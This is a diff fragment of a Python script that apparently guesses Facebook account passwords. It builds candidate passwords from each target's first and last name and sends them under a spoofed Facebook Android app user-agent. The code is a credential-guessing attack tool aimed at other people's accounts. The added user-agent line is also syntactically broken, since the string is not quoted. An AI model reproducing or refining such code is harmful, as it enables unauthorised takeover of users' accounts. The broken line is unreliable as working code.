@@ -443,7 +443,7 @@ def api1(ids,names,passlist):
 				ln = fn
 			for pw in passlist:
 				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-				ua_string = 
+				ua_string = Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)[FBAN/FB4A;FBAV/245.0.0.52.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/236695953;FBCR/TMO;FBMF/samsung;FBBD/samsung;FBDV/SM-G991B;FBSV/11;FBCA/arm64-v8a:armeabi-v7a;FBDM/{density=3.0,width=1080,height=2220};FB_FW/1;]
 				li = ['28','29','210']
 				li2 = random.choice(li)
 				j1 = ''.join(random.choice(digits) for _ in range(2))
